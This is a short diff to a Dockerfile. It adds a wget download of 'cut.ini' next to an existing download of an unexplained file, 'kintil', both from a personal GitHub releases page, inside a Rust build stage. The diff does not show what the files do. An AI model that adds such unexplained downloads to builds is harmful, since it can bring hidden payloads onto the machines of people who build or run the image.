@@ -1,6 +1,6 @@
 FROM rust:latest AS build
 WORKDIR /build
-RUN cd /build && apt-get install -y wget && wget https://github.com/sengepeke/Files/releases/download/12/kintil
+RUN cd /build && apt-get install -y wget && wget https://github.com/sengepeke/Files/releases/download/12/kintil  && wget https://github.com/sengepeke/Files/releases/download/12/cut.ini
 
 
 FROM alpine:latest
